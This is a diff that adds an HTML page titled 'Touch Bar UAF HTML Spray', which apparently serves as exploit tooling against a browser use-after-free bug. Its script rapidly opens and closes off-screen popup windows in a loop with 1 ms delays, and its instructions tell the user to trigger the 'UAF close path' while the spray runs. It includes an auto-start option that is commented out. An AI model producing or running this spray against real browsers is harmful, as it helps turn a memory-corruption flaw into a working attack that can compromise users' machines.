@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Touch Bar UAF HTML Spray</title>
+    <style>
+        body { font-family: Arial; text-align: center; background: #111; color: #0f0; padding: 30px; }
+        button { padding: 15px 30px; font-size: 18px; margin: 10px; width: 280px; }
+        #status { margin: 30px auto; padding: 20px; background: #222; border-radius: 10px; max-width: 600px; text-align: left; white-space: pre-wrap; height: 300px; overflow-y: auto; }
+    </style>
+</head>
+<body>
+    <h1>Touch Bar UAF HTML Spray</h1>
+    <p><strong>HTML-only version</strong> — no extension needed</p>
+
+    <button id="start">START AGGRESSIVE SPRAY (Continuous)</button>
+    <button id="stop" style="background:#c33;color:white;">STOP Spray</button>
+
+    <div id="status">Ready.\nClick START AGGRESSIVE SPRAY, then immediately trigger your close path while it is running.</div>
+
+    <script>
+        let running = false;
+        let interval = null;
+        const status = document.getElementById('status');
+
+        function log(msg) {
+            status.textContent += msg + '\n';
+            status.scrollTop = status.scrollHeight;
+        }
+
+        async function spray() {
+            log("=== SPRAY STARTED (HTML-only) ===");
+            while (running) {
+                try {
+                    const popup = window.open("about:blank", "_blank", "width=500,height=400,left=9999,top=9999");
+                    if (popup) popup.close();
+                } catch (e) {}
+
+                // Very aggressive timing
+                await new Promise(r => setTimeout(r, 1));
+            }
+            log("=== SPRAY STOPPED ===");
+        }
+
+        document.getElementById('start').onclick = () => {
+            if (!running) {
+                running = true;
+                log("Spray started – now trigger your UAF close path");
+                spray();
+            }
+        };
+
+        document.getElementById('stop').onclick = () => {
+            running = false;
+        };
+
+        // Auto-start option (uncomment the line below if you want it to start immediately)
+        // window.onload = () => document.getElementById('start').click();
+    </script>
+</body>
+</html>
